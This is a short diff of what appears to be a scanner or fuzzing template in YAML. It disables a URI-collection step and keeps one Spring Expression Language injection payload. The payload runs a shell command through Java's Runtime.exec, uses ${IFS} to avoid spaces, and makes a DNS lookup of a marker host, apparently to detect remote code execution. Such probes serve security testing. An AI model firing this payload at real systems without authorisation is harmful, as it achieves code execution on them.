@@ -1,6 +1,6 @@
-collect:
-  - uniq:
-    - [ URI ]
+#collect:
+#  - uniq:
+#    - [ URI ]
 generate:
   - payload:
     - T(java.lang.Runtime).getRuntime().exec("getent${IFS}DNS_MARKER")
